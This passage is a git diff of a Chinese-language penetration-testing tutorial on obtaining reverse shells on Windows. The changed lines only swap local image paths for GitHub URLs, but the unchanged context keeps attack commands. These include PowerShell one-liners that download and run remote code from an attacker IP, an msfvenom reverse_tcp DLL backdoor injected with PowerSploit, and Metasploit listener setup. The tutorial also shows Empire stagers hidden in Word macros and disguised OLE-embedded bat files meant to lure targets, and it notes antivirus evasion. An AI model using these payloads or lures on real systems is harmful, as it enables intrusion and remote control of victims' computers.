@@ -122,7 +122,7 @@ Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、
 
 Windows运行cobaltstrike.jar #用户名随便输入 密码123
 
-![1598437160](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437160.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/1598437160.png)
 
 ③开启监听:
 
@@ -132,7 +132,7 @@ payload可选择windows/beacon_http/reverse_http
 
 说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器
 
-![1598437131](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437131.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/1598437131.png)
 
 ④生成powershell payload:
 
@@ -140,7 +140,7 @@ payload可选择windows/beacon_http/reverse_http
 
 Type选择 powershell
 
-![1598437118](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437118.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/1598437118.png)
 
 生成的payload：
 
@@ -150,9 +150,9 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 
 ⑤生成代码已经给出了，在windows上执行
 
-![1598437102](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437102.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/1598437102.png)
 
-![1598437091](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1598437091.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/1598437091.png)
 
 ### python反弹cmd
 
@@ -217,7 +217,7 @@ reverse.exe 192.168.203.140 4455
 
 攻击端用nc监听，即可反弹cmd。实际测试bypass av效果也比较好
 
-![1734768-2c2296daae714cb0](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/1734768-2c2296daae714cb0.webp)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/1734768-2c2296daae714cb0.webp)
 
 #### 自定义powershell函数反弹shell
 
@@ -250,20 +250,20 @@ usestager windows/macro http #生成payload
 execute
 ```
 
-![t01ebd92ae5c2752d1a](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01ebd92ae5c2752d1a.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01ebd92ae5c2752d1a.png)
 
-![t01c424d48628a2722b](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01c424d48628a2722b.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01c424d48628a2722b.png)
 
 生成/tmp/macro 攻击代码后，新建一个word 创建宏
 
-![t017c0553a3aab1b9de](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t017c0553a3aab1b9de.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t017c0553a3aab1b9de.png)
 
 点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(*.doc)”或者“启用宏的Word 文档(*.docm)”文件，当诱导目标打开，执行宏后，即可成功反弹shell：
 说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”
 
-![t0110d78f8b6dc573b7](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t0110d78f8b6dc573b7.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t0110d78f8b6dc573b7.png)
 
-![t0153edfb39e2d25b0e](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t0153edfb39e2d25b0e.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t0153edfb39e2d25b0e.png)
 
 ### 利用office OLE对象插入bat文件反弹shell
 
@@ -274,15 +274,15 @@ usestager windows/launcher_bat http
 execute
 ```
 
-![t017b89a4956e058dd2](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t017b89a4956e058dd2.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t017b89a4956e058dd2.png)
 
 在word中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击launcher_lltest.xls文件，执行后，即可成功反弹shell：
 
-![t019fac2fa169e37faf](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t019fac2fa169e37faf.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t019fac2fa169e37faf.png)
 
-![t01df44007f3dfd7c7f](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01df44007f3dfd7c7f.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01df44007f3dfd7c7f.png)
 
-![t01d3703513e3d73d1a](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01d3703513e3d73d1a.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01d3703513e3d73d1a.png)
 
 ### PowerSploit DLL注入反弹shell
 
@@ -297,7 +297,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667
 # 说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp
 ```
 
-![t01b4caf8412924dfcc](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01b4caf8412924dfcc.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01b4caf8412924dfcc.png)
 
 2）metasploit 设置payload 开启监听
 
@@ -309,7 +309,7 @@ set LPORT 6667
 exploit
 ```
 
-![t012d0e9a74a7f468ca](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t012d0e9a74a7f468ca.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t012d0e9a74a7f468ca.png)
 
 3）powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门
 首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程
@@ -322,13 +322,13 @@ IEX (New-Object Net.WebClient).DownloadString("http://192.168.159.134/PowerSploi
 Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll
 ```
 
-![t013b399a39f86d7729](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t013b399a39f86d7729.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t013b399a39f86d7729.png)
 
-![t01121eca1107d335a1](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01121eca1107d335a1.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01121eca1107d335a1.png)
 
-![t017f8aa99b2a307bcf](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t017f8aa99b2a307bcf.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t017f8aa99b2a307bcf.png)
 
-![t01ebe09a11da4904bc](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01ebe09a11da4904bc.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01ebe09a11da4904bc.png)
 
 ### metasploit反弹shell
 
@@ -348,9 +348,9 @@ powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRe
 $f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring('http://192.168.159.134:8080/4iNSwaMtwWjm');
 ```
 
-![t01059c412e75c4ff00](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t01059c412e75c4ff00.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t01059c412e75c4ff00.png)
 
-![t0154717c97e799d852](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/t0154717c97e799d852.png)
+![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/t0154717c97e799d852.png)
 
 ### 内存shellcode执行
 
